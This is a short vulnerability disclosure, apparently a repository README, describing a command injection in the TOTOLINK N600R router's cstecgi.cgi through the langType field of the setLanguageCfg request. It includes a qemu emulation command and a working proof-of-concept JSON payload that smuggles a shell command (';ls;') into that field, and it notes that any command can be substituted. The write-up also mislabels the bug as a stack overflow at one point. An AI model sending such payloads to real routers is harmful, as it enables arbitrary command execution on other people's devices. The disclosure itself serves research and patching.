# TOTOLINK-N600R-setLanguageCfg-CommandInjection

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a StackOverflow vulnerability in the TOTOLINK-N600R router.

By analyzing the cstecgi.cgi file in the cgi-bin directory, I found that the function at address 0x4159F8 contains a command injection vulnerability.

The command injection can be triggered by the langType key value, which leads to a sprintf command injection.

![image-20241216165906585](https://gitee.com/xyqer/pic/raw/master/202412191538676.png)

## How can we simulate a router

﻿Use the following command to simulate with qemu.

```bash
sudo chroot . ./qemu-mips-static -E CONTENT_LENGTH=300 -E QUERY_STRING="action=no" -L /lib ./web_cste/cgi-bin/cstecgi_patch.cgi < ./poc.json
```

﻿The content of the **poc.json** file is as follows:

```json
{"topicurl":"setLanguageCfg","langType":";ls;"}
```

## Attack result

![image-20241216170307530](https://gitee.com/xyqer/pic/raw/master/202412191538392.png)

﻿You can see that the command "ls" has been executed. If you want to execute other instructions, you only need to modify the key value of langType. You can execute any number of arbitrary instructions.